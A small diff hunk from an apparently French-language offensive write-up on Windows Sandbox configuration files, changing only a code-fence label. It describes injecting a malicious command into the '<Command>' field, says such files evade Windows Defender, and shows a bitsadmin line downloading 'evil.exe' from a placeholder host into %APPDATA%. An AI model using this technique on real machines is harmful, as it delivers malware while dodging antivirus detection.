@@ -32,7 +32,7 @@ voici l'exemple d'un fichier de configuration:
 Une des première méthodes consiste à modifier le champs `<Command>` pour executer notre commande malicieuse et accéder au fichiers systèmes de l'hote, en plus de ça les fichiers WSB ne se font pas détecter par Windows Defender.
 
 Commande possible d'injecter:
-```xml
+```powershell
 <Command>bitsadmin /transfer myjob /download /priority high http://legit/evil.exe"%APPDATA%\file">nul&</Command>
 ```
 
